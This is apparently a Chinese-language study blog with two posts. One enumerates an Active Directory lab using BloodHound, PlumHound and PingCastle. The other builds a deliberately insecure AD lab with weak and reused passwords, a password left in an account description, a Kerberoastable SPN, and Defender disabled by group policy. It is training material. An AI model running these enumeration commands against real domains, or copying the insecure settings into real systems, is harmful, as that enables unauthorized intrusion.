<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **bloodhound <span class="comment">#依據neo4j設定帳密登入**</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/bloodhound]</span><br><span class="line">└─# **<span class="built_in">sudo</span> bloodhound-python -d MARVEL.<span class="built_in">local</span> -u fcastle -p Password1 -ns 192.168.19.140 -c all**</span><br><span class="line">INFO: Found AD domain: marvel.local</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: hydra-dc.marvel.local</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 3 computers</span><br><span class="line">INFO: Connecting to LDAP server: hydra-dc.marvel.local</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 52 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 3 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: SPIDERMAN.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Querying computer: THEPUNISHER.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Querying computer: HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Skipping enumeration <span class="keyword">for</span> SPIDERMAN.MARVEL.<span class="built_in">local</span> since it could not be resolved.</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 02S</span><br></pre></td></tr></table></figure>

<p>執行完成後，就會輸出幾個json檔，將這些檔案上傳bloodhound。</p>
<p>按住shift一次選取全部</p>
<p><img src="/img/ADEmum_Untitled_1.png" alt="Untitled"></p>
<p>點選Analysis &gt;點選想要查看的資訊，選擇出現的圖示查看相關內容</p>
<p>通過查看Analysis的各種內容，可以發現各種可能洩漏得資訊，從而知道可以利用甚麼漏洞進行攻擊</p>
<p><img src="/img/ADEmum_Untitled_2.png" alt="Untitled"></p>
<p><img src="/img/ADEmum_Untitled_3.png" alt="Untitled"></p>
<h2 id="Domain-Enumeration-with-Plumhound"><a href="#Domain-Enumeration-with-Plumhound" class="headerlink" title="Domain Enumeration with Plumhound"></a><strong>Domain Enumeration with Plumhound</strong></h2><p><a target="_blank" rel="noopener" href="https://github.com/PlumHound/PlumHound">https://github.com/PlumHound/PlumHound</a></p>
<p><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/">https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/</a></p>
<p>PlumHound 的框架</p>
<ul>
<li>BloodHoundAD 的報告引擎，可為藍隊、系統管理員和分析師提供可操作的報告。</li>
<li>利用 Neo4j 中 BloodHoundAD 的控制路徑查找功能為藍隊建立可操作的情報，以識別 Active Directory 問題。</li>
<li>操作<ul>
<li>指定 Neo4j 資料庫連線並指定您想要執行的「task-list」。</li>
<li>task-list是cypher queries和metadata 的集合，它們告訴 PlumHound 要執行什麼查詢以及如何從輸出產生報表。</li>
<li>PlumHound 隨附的「預設」任務清單包括 69 份報表和一個index。</li>
</ul>
</li>
</ul>
<p>它可以視覺化複雜的 Active Directory 結構、尋找可能的攻擊路徑並提供環境的良好概述</p>
<p>BloodHound CE GUI 非常適合辨識攻擊路徑或尋找有趣的目標。</p>
<ul>
<li>概述了所有 AD 物件及其相互之間的關係</li>
<li>對於每個對象，都有大量資訊可用且可以視覺化，例如<em>使用者可以透過 RDP 連接到哪些主機？使用者擁有哪些物件控制項？</em></li>
<li>GUI 的最大優點是視覺化更長的鏈，並能夠輕鬆查看如何利用鏈中的每個關係</li>
</ul>
<p>如果 Neo4j 伺服器位於本機上，不需要指定 Neo4j 連線</p>
<p>另一種存取 BloodHound 資料的方法是直接透過 neo4j。資料無法像 GUI 那樣視覺化</p>
<p>但對於某些用例，基於原始文字的結果</p>
<p>此外，Web 介面中還提供了將資料匯出為 csv 檔案的選項，這對於向客戶提供有關受影響資源（如果受影響資源較多）的資訊非常有用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# **python3 PlumHound.py --easy -p kali** </span><br><span class="line"></span><br><span class="line">        PlumHound 1.6</span><br><span class="line">        For more information: https://github.com/plumhound</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Server: bolt://localhost:7687</span><br><span class="line">        User: neo4j</span><br><span class="line">        Password: *****</span><br><span class="line">        Encryption: False</span><br><span class="line">        Timeout: 300</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Task: Easy</span><br><span class="line">        Query Title: Domain Users</span><br><span class="line">        Query Format: STDOUT</span><br><span class="line">        Query Cypher: MATCH (n:User) RETURN n.name, n.displayname</span><br><span class="line">        --------------------------------------</span><br><span class="line">INFO    Found 1 task(s)</span><br><span class="line">INFO    --------------------------------------</span><br><span class="line"> .....</span><br><span class="line">      ADMINISTRATOR@MARVEL.LOCAL</span><br><span class="line">      TSTARK@MARVEL.LOCAL         Tony Stark</span><br><span class="line">      SQLSERVICE@MARVEL.LOCAL     SQLService</span><br><span class="line">      FCASTLE@MARVEL.LOCAL        Frank Castle</span><br><span class="line">      RKXJHDREXH@MARVEL.LOCAL     rkxJHDREXh</span><br><span class="line">      QDPZDMZFFY@MARVEL.LOCAL     QdPzdMZFFY</span><br><span class="line">      PPARKER@MARVEL.LOCAL        Peter Parker</span><br><span class="line">      KRBTGT@MARVEL.LOCAL</span><br><span class="line">      GUEST@MARVEL.LOCAL</span><br><span class="line">on 1: </span><br><span class="line">         Executing Tasks |██████████████████████████████████████████████████| Tasks 1 / 1  <span class="keyword">in</span> 2.4s</span><br><span class="line"></span><br><span class="line">        Completed 1 of 1 tasks.</span><br><span class="line"></span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# **python3 PlumHound.py -x tasks/default.tasks -p kali**</span><br><span class="line"></span><br><span class="line">        PlumHound 1.6</span><br><span class="line">        For more information: https://github.com/plumhound</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Server: bolt://localhost:7687</span><br><span class="line">        User: neo4j</span><br><span class="line">        Password: *****</span><br><span class="line">        Encryption: False</span><br><span class="line">        Timeout: 300</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Tasks: Task File</span><br><span class="line">        TaskFile: tasks/default.tasks</span><br><span class="line">        Found 88 task(s)</span><br><span class="line">        --------------------------------------</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# <span class="built_in">cd</span> reports  </span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">AdminGroups.csv                              LapsDeploymentCount-OS.html</span><br><span class="line">AdminGroups.html                             LAPSNotEnabled.html</span><br><span class="line">AdminsWithoutSensitiveFlag.html.csv          LocalAdmin_Groups_Count.html</span><br><span class="line">AdminsWithoutSensitiveFlag.html.html         LocalAdmin_Groups.html</span><br><span class="line">CertificateAuthorties.csv                    LocalAdmin_UsersCount.html</span><br><span class="line">CertificateAuthorties.html                   LocalAdmin_Users.html</span><br><span class="line">CertificateTemplateEnrollRights.csv          OperatingSystemCount.html</span><br><span class="line">CertificateTemplateEnrollRights.html         OperatingSystemUnsupported.csv</span><br><span class="line">CertificateTemplates.csv                     OperatingSystemUnsupported.html</span><br><span class="line">CertificateTemplates_ESC1.csv                OUs_Count.html</span><br><span class="line">CertificateTemplates_ESC1.html               Owned-Computers-Groups.html</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **firefox index.html**          </span><br></pre></td></tr></table></figure>

<p><img src="/img/ADEmum_Untitled_4.png" alt="Untitled"></p>
<p>firefox進程被占用無法開啟html檔案</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **ps -u root | grep firefox**</span><br><span class="line"> 704533 pts/1    00:01:54 firefox-esr</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **<span class="built_in">kill</span> -9 704533**</span><br><span class="line">                                                                                           </span><br><span class="line">[2]  + killed     firefox domain_users_by_group.html</span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **firefox index.html**           </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>許多工具都能夠為給定網域產生使用者列表，但使用 BloodHound CE API 或 neo4j 資料庫有一個很大的優勢：能夠過濾特定條件。</p>
<p>根據特定標準，可以篩選出最感興趣的使用者或可能會取得最大成功的使用者。腳本產生 4 個使用者檔案：</p>
<ul>
<li>enabledUsers.txt</li>
<li>enabledTierZeroUsers.txt</li>
<li>enabledInactiveUsers.txt</li>
<li>enabledPotentialAdminUsers.txt</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.8com.de/cyber-security-blog/bloodhound-ce-and-automating-parts-of-ad-pentests">https://www.8com.de/cyber-security-blog/bloodhound-ce-and-automating-parts-of-ad-pentests</a></p>
<h2 id="Domain-Enumeration-with-PingCastle"><a href="#Domain-Enumeration-with-PingCastle" class="headerlink" title="Domain Enumeration with PingCastle"></a><strong>Domain Enumeration with PingCastle</strong></h2><p><a target="_blank" rel="noopener" href="https://www.pingcastle.com/download/">https://www.pingcastle.com/download/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/pingcastle/">https://www.ddosi.org/pingcastle/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/109286621">https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;109286621</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@jshake/pingcastle-vs-purple-knight-active-directory-security-b818fa7fc36d">https:&#x2F;&#x2F;medium.com&#x2F;@jshake&#x2F;pingcastle-vs-purple-knight-active-directory-security-b818fa7fc36d</a></p>
<p>加入到您想要評估的 Active Directory 環境的電腦上執行 PingCastle.exe 程式</p>
<p><img src="/img/ADEmum_Untitled_5.png" alt="Untitled"></p>
<p>1-healthcheck-對域的風險進行評分</p>
<ul>
<li>在幾分鐘的時間內，它會產生一個報告，給你一個Active Directory安全性的概覽。透過使用現有的信任鏈接，可以在其他網域上產生此報告。</li>
</ul>
<p>2-conso -將多份報表聚合為單一報表</p>
<ul>
<li>有了許多健康檢查報告，您可以獲得整個範圍的單一報告。將生成地圖。</li>
</ul>
<p>3-carto -建構所有互聯域的映射</p>
<ul>
<li>它合併了將在所有受信任網域上運行的健康檢查報告，然後是conso選項。但是更輕，然後更快。</li>
</ul>
<p>4-scanner -對工作站進行特定的安全檢查</p>
<ul>
<li>您可以知道您的本機管理員，如果Bitlocker配置正確，發現不保護的共享，…一個選單將顯示選擇正確的掃描器。</li>
</ul>
<p>5-export -匯出使用者或計算機</p>
<ul>
<li>不要涉及您的管理員，取得您想要獲得的使用者或電腦清單。將顯示一個選單來選擇匯出。</li>
</ul>
<p>6-advanced -開啟進階選單</p>
<ul>
<li>這是您希望在不使用命令列開關的情況下配置PingCastle的地方。</li>
</ul>
<p>必須在ad網域下的用戶，點擊exe檔案執行，並在第一個選項按enter再次按enter後，如果正常運行會跑出.local檔案</p>
<p><img src="/img/ADEmum_Untitled_6.png" alt="Untitled"></p>
<p>僅參考</p>
<p>雙擊點開該檔案會看到該網域的風險值…可以看到各種對於該網域有的風險甚至進行利用..</p>
<p>打開 HTML 報告後，了解評分非常重要。高分域名&#x3D;高風險。領域風險等級有一個總分，等於 4 個子分數中最差的分數。</p>
<p>滿分 100 分，4 個分項部分分別是<strong>特權帳號、信任、過時物件</strong>和<strong>安全異常</strong>。每個小節都會有描述和找到的“規則”，並根據規則的重要性給予不同的分數。</p>
<p><img src="/img/ADEmum_Untitled_7.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AD LAB build" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AD%20LAB%20build/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.071Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AD%20LAB%20build/">
        AD LAB Build
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="AD-LAB-Build"><a href="#AD-LAB-Build" class="headerlink" title="AD LAB Build"></a>AD LAB Build</h1><p><a target="_blank" rel="noopener" href="https://github.com/Dewalt-arch/pimpmyadlab">https://github.com/Dewalt-arch/pimpmyadlab</a></p>
<hr>
<h2 id="Lab-Overview-and-Requirements"><a href="#Lab-Overview-and-Requirements" class="headerlink" title="Lab Overview and Requirements"></a><strong>Lab Overview and Requirements</strong></h2><p>one windows server - server 2022</p>
<p>two windows 10 workstations</p>
<h3 id="Lab-Build-Cloud-Alternative"><a href="#Lab-Build-Cloud-Alternative" class="headerlink" title="Lab Build - (Cloud Alternative)"></a><strong>Lab Build - (Cloud Alternative)</strong></h3><p>Building Free Active Directory Lab in Azure - <a target="_blank" rel="noopener" href="https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f</a></p>
<p>going to be building the lab in the cloud using Azure</p>
<ul>
<li>It need to cost money..</li>
</ul>
<h3 id="Downloading-Necessary-ISOs"><a href="#Downloading-Necessary-ISOs" class="headerlink" title="Downloading Necessary ISOs"></a><strong>Downloading Necessary ISOs</strong></h3><p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/evalcenter">https://www.microsoft.com/en-us/evalcenter</a></p>
<ul>
<li>免費的話每三十分鐘會關機</li>
</ul>
<p>下載這兩個iso</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://info.microsoft.com/ww-landing-windows-10-enterprise.html">Windows 10 Enterprise Trial (microsoft.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://info.microsoft.com/ww-landing-windows-server-2022.html">Windows Server 2022 Trial (microsoft.com)</a></li>
</ul>
<table>
<thead>
<tr>
<th>Windows 10 Enterprise</th>
<th>XGVPP-NMH47-7TTHJ-W3FW7-8HV2C</th>
</tr>
</thead>
</table>
<p>vm 卡在BIOS&gt;</p>
<ul>
<li>記得改選項</li>
</ul>
<p><img src="/img/ADLAB_Untitled.png" alt="Untitled"></p>
<h2 id="Windows-server-setting-Domain-Controller"><a href="#Windows-server-setting-Domain-Controller" class="headerlink" title="Windows server setting - Domain Controller"></a>Windows server setting - Domain Controller</h2><p>Win Server &gt; choose 2&gt;I accept &gt;Custom&gt;click new&gt;Apply&gt;next&gt;</p>
<p><img src="/img/ADLAB_Untitled_1.png" alt="Untitled"></p>
<p>Customize setting &gt; P@$$w0rd! &gt; setup</p>
<ul>
<li>passwd → Akali@</li>
</ul>
<p><img src="/img/ADLAB_Untitled_2.png" alt="Untitled"></p>
<p>先對 WinServer 進行命名</p>
<p>可以再搜索框直接打name &gt; View your PC name &gt; Rename this PC&gt;設定任何名稱可以識別即可</p>
<p><img src="/img/ADLAB_Untitled_3.png" alt="Untitled"></p>
<h3 id="Make-this-a-domain-controller"><a href="#Make-this-a-domain-controller" class="headerlink" title="Make this a domain controller"></a>Make this a domain controller</h3><p><img src="/img/ADLAB_Untitled_4.png" alt="Untitled"></p>
<p>Server manager &gt; Manage &gt; Add Roles and Features &gt; next &gt; next &gt; 打勾 Active Directory Domain Service &gt;next&gt;next&gt;next&gt;打勾 Restart the destination server automatically &gt; Install </p>
<p>下載後會出現Promote this server to …，點擊進去</p>
<p><img src="/img/ADLAB_Untitled_5.png" alt="Untitled"></p>
<ul>
<li>Add a new forest<ul>
<li>cause we don’t have an existing domain and new domain to an existing forest</li>
</ul>
</li>
</ul>
<p>gonna create own forest, but this forest is gonna have one little domain in it </p>
<ul>
<li>finish fill the domain name &gt; click next</li>
</ul>
<p><img src="/img/ADLAB_Untitled_6.png" alt="Untitled"></p>
<p>Setting up a functional level</p>
<ul>
<li>Password</li>
</ul>
<p><img src="/img/ADLAB_Untitled_7.png" alt="Untitled"></p>
<p>next &gt; next&gt;這邊會生成domain name&gt;next&gt;next&gt;next</p>
<p><img src="/img/ADLAB_Untitled_8.png" alt="Untitled"></p>
<p>最後都設定好就直接下載</p>
<p><img src="/img/ADLAB_Untitled_9.png" alt="Untitled"></p>
<p>重開機後登入新的domain account</p>
<h3 id="Set-up-certificate-services"><a href="#Set-up-certificate-services" class="headerlink" title="Set up certificate services"></a>Set up certificate services</h3><ul>
<li>used to verify identities in a domain controller &gt; enhanced security</li>
<li>allow us used LDAP secure or LDAP s</li>
<li>LDAP is truly your phone book, lightweight Directory access protocol</li>
<li>want to add security or basic feature, make sure you’re implementing certificate services</li>
</ul>
<p>Server manager &gt; Manage &gt; Add Roles and Features &gt; next &gt; next &gt; 打勾Active Directory Certificate Services </p>
<p><img src="/img/ADLAB_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_11.png" alt="Untitled"></p>
<p>next&gt;next&gt;next&gt;打勾 Restart the destination server automatically &gt; Install </p>
<p>下載完後進入設定</p>
<p><img src="/img/ADLAB_Untitled_12.png" alt="Untitled"></p>
<p>next &gt; check Certification Authority &gt; next&gt;next&gt;next&gt;next&gt;next&gt; change 99 year&gt;next&gt;configure </p>
<p>then reboot server </p>
<p><img src="/img/ADLAB_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_15.png" alt="Untitled"></p>
<h3 id="Windows-10-setting-User-Machines-2"><a href="#Windows-10-setting-User-Machines-2" class="headerlink" title="Windows 10 setting- User Machines *2"></a>Windows 10 setting- User Machines *2</h3><p>在設定vm時記得要修改成Enterprise</p>
<p><img src="/img/ADLAB_Untitled_16.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_17.png" alt="Untitled"></p>
<p>兩台的vm設置相同，跟前面server的安裝過程一樣</p>
<p>選擇Domain join instead </p>
<p>陸續輸入帳號密碼，密碼一率都輸入Akali@</p>
<p><img src="/img/ADLAB_Untitled_18.png" alt="Untitled"></p>
<p>取消勾選所有選項</p>
<p><img src="/img/ADLAB_Untitled_19.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_20.png" alt="Untitled"></p>
<p>下載vm tool &gt; 設定主機名稱</p>
<p>重開機</p>
<hr>
<h2 id="Setting-Up-Users-Groups-and-Policies"><a href="#Setting-Up-Users-Groups-and-Policies" class="headerlink" title="Setting Up Users, Groups, and Policies"></a><strong>Setting Up Users, Groups, and Policies</strong></h2><p>modifying the domain controller and setting up some users, groups and policies</p>
<ul>
<li>adding users、look at OU、objects、domain policies</li>
<li>stores all of users and computers</li>
<li>here can see different OU</li>
</ul>
<p><img src="/img/ADLAB_Untitled_21.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_22.png" alt="Untitled"></p>
<ul>
<li><p>see the computer that are joined to the domain</p>
</li>
<li><p>see what users exist</p>
<p>  <img src="/img/ADLAB_Untitled_23.png" alt="Untitled"></p>
<ul>
<li>enterprise admins</li>
<li>domain admins</li>
<li>some of the important groups</li>
<li>good for us an attack<ul>
<li>compromise domain admin</li>
<li>enterprise admin..</li>
</ul>
</li>
</ul>
</li>
<li><p>separate these out</p>
</li>
</ul>
<p><img src="/img/ADLAB_Untitled_24.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_25.png" alt="Untitled"></p>
<ul>
<li>move that into groups &gt; click Don’t show this…</li>
</ul>
<p><img src="/img/ADLAB_Untitled_26.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_27.png" alt="Untitled"></p>
<p>So the only account that we have to login into domain </p>
<p><img src="/img/ADLAB_Untitled_28.png" alt="Untitled"></p>
<ul>
<li>creat other administrator<ul>
<li>copy that administrator</li>
<li>It will copy all of the permissions that the administrator has</li>
<li>可以查看administrator有什麼權限..</li>
</ul>
</li>
</ul>
<p><img src="/img/ADLAB_Untitled_29.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_30.png" alt="Untitled"></p>
<p>copy後填入用戶訊息 &gt; tstark &gt; passwd &gt; Akali@@</p>
<p><img src="/img/ADLAB_Untitled_31.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_32.png" alt="Untitled"></p>
<p>Create a service and account that is a domain administrator</p>
<ul>
<li>SQLService &gt; password &gt; MYpassword123#</li>
<li>run as domain admin</li>
<li>名字間不要有空格</li>
</ul>
<p><img src="/img/ADLAB_Untitled_33.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_34.png" alt="Untitled"></p>
<p>很多管理員會在Description留下機敏資訊，這邊模擬他們的行為</p>
<p><img src="/img/ADLAB_Untitled_35.png" alt="Untitled"></p>
<p>再創兩個低權限用戶在domain user group</p>
<p><img src="/img/ADLAB_Untitled_36.png" alt="Untitled"></p>
<ul>
<li>fcastle &gt; Password1</li>
</ul>
<p><img src="/img/ADLAB_Untitled_37.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_38.png" alt="Untitled"></p>
<p>從前面可以看到許多不安全設定</p>
<p>複製Frank用戶設定</p>
<p><img src="/img/ADLAB_Untitled_39.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_40.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_41.png" alt="Untitled"></p>
<p>全部設定完長這樣</p>
<p><img src="/img/ADLAB_Untitled_42.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WinServer -&gt;</span><br><span class="line">DC name -  HYDRA-DC</span><br><span class="line">Forest - MARVEL.<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">useradd -&gt;</span><br><span class="line">+ admin -&gt;</span><br><span class="line">	+ Tony Stark -&gt;</span><br><span class="line">		+ logon name - tstark</span><br><span class="line">		+ passwd - Akali@@</span><br><span class="line">	+ SQLService -&gt;</span><br><span class="line">		+ logon name - SQLService</span><br><span class="line">		+ passwd -&gt; MYpassword123#</span><br><span class="line">		+ description leak the passwd</span><br><span class="line"></span><br><span class="line">+ user -&gt;</span><br><span class="line">	+ Frank Castle - &gt;</span><br><span class="line">		+ logon name - fcastle</span><br><span class="line">		+ passwd - Password1</span><br><span class="line">	+ Peter Parker -&gt;</span><br><span class="line">		+ logon name - pparker</span><br><span class="line">		+ passwd - Akali@@</span><br></pre></td></tr></table></figure>

<p>Create a file share &gt; abuse later on</p>
<ul>
<li>File and Storage Services &gt;Share &gt; New Share &gt; next &gt; next</li>
</ul>
<p><img src="/img/ADLAB_Untitled_43.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_44.png" alt="Untitled"></p>
<p>have a remote path for us of Hydro DC hackme &gt; next&gt;next&gt;create</p>
<p><img src="/img/ADLAB_Untitled_45.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_46.png" alt="Untitled"></p>
<p>Setup the service account fully that we had before</p>
<p>開啟CMD並用管理員身分運行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.20348.587]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;**setspn -a HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111 MARVEL\SQLService</span><br><span class="line">Checking domain DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">Registering ServicePrincipalNames <span class="keyword">for</span> CN=SQL Service,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111</span><br><span class="line">Updated object**</span><br></pre></td></tr></table></figure>

<ul>
<li>MARVEL.local 網域中名為 HYDRA-DC 的伺服器上執行的服務新增服務主體名稱 (SPN)</li>
</ul>
<p>如果要使用 Active Directory 作為 Kerberos 實作，請使用 <code>setspn</code> 指令來登錄 SPN。 要執行此指令，必須滿足下列條件：</p>
<ul>
<li>您必須登入到網域控制站</li>
<li>您必須使用提升的特權（以管理者身分執行）來執行命令提示字元</li>
<li>您必須是 Domain Admins 群組的成員（或者網域管理者已授予您適當的許可權）</li>
</ul>
<p>此命令將傳回在 MARVEL.local 網域中註冊的所有 SPN 的列表，以及關聯的服務類別和伺服器名稱。它對於解決 SPN 相關問題或驗證網域中配置的 SPN 非常有用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;**setspn -T MARVEL.<span class="built_in">local</span> -Q */***</span><br><span class="line">Checking domain DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">CN=HYDRA-DC,OU=Domain Controllers,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/ForestDnsZones.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/DomainDnsZones.MARVEL.<span class="built_in">local</span></span><br><span class="line">        DNS/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        GC/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL.<span class="built_in">local</span></span><br><span class="line">        RestrictedKrbHost/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        RestrictedKrbHost/HYDRA-DC</span><br><span class="line">        RPC/ff28a91a-7cfe-4680-84a0-e7ccfe7f8feb._msdcs.MARVEL.<span class="built_in">local</span></span><br><span class="line">        HOST/HYDRA-DC/MARVEL</span><br><span class="line">        HOST/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL</span><br><span class="line">        HOST/HYDRA-DC</span><br><span class="line">        HOST/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        HOST/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL.<span class="built_in">local</span></span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/ff28a91a-7cfe-4680-84a0-e7ccfe7f8feb/MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC/MARVEL</span><br><span class="line">        ldap/ff28a91a-7cfe-4680-84a0-e7ccfe7f8feb._msdcs.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL</span><br><span class="line">        ldap/HYDRA-DC</span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL.<span class="built_in">local</span></span><br><span class="line">CN=krbtgt,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=SQL Service,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111</span><br><span class="line"></span><br><span class="line">**Existing SPN found!**</span><br></pre></td></tr></table></figure>

<ul>
<li>存在<strong>Kerberos rusting attack risk</strong></li>
<li>只需一個網域帳戶即可執行 Kerberoasting，**服務主體名稱 (SPN)**可以請求 - 任何人都可以執行此操作</li>
<li>Kerberos 驗證使用 SPN 將服務實例與使用者帳戶關聯。</li>
<li>這允許客戶端應用程式要求服務對帳戶進行身份驗證，即使客戶端不知道帳戶名稱也是如此。</li>
<li>當提供指定一個<strong>SPN 的TGS 請求</strong>並且該 SPN 已在 Active Directory 中註冊時，網域控制站會提供一張票證。該票證包含執行該服務的帳戶的<strong>金鑰</strong>。有了這些訊息，攻擊者現在就可以嘗試使用票據離線<strong>暴力攻擊</strong>進行破解，從而獲取用戶的明文密碼。</li>
</ul>
<p>設定Group policy</p>
<ul>
<li>pushing for the entire domain</li>
<li>搜索框搜尋Group</li>
<li>Specifically create GPOs for specific groups or users &gt; do it for whole domain</li>
</ul>
<p><img src="/img/ADLAB_Untitled_47.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_48.png" alt="Untitled"></p>
<p>going to disable Windows Defender in this environment &gt; attacker can run all attacks</p>
<ul>
<li>where is antivirus going to get picked up if run an attack</li>
</ul>
<p><img src="/img/ADLAB_Untitled_49.png" alt="Untitled"></p>
<p>找到Microsoft Defender Antivirus &gt; Turn off Microsoft Defender Antivirus</p>
<ul>
<li>再更早版本的winser含2019 &gt; Windows Defender Antivirus</li>
</ul>
<p><img src="/img/ADLAB_Untitled_50.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_51.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_52.png" alt="Untitled"></p>
<p>回到GPO設定 &gt; Disable Windows Defender &gt; Enforced</p>
<ul>
<li>anytime that user joins the domain or a computer joins the domain, it’s going to get this policy</li>
